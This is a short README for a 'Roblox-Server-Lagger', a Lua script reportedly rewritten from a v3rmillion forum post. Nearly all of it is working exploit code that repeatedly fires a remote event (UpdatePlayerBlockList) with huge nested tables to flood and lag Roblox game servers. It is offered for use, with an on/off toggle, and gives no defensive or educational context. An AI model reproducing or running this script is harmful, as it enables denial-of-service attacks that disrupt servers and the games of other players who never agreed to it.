# Roblox-Server-Lagger
lags roblox servers (originally made/released by https://v3rmillion.net/showthread.php?tid=1168732 to my knowledge, just rewritten)

# Usage
```
getgenv().Enabled = true -- change to false to disable

local Network = game:GetService("NetworkClient")
local Update = game:GetService("RobloxReplicatedStorage").UpdatePlayerBlockList

local Lag = function()
    local Main = {}
    local Spammed = {}
    
    local Table = {}
    table.insert(Spammed, Table)
    
    for _ = 1, 250 do
        local TableToInsert = {}
        
        table.insert(Table, TableToInsert)
        Table = TableToInsert
    end
    
    local Max = (499999 / (255))
    
    for _ = 1, Max do
        table.insert(Main, Spammed)
    end
    
    Update:FireServer(Main)
end

while task.wait(1) and getgenv().Enabled == true do
    task.spawn(Lag)
end
```
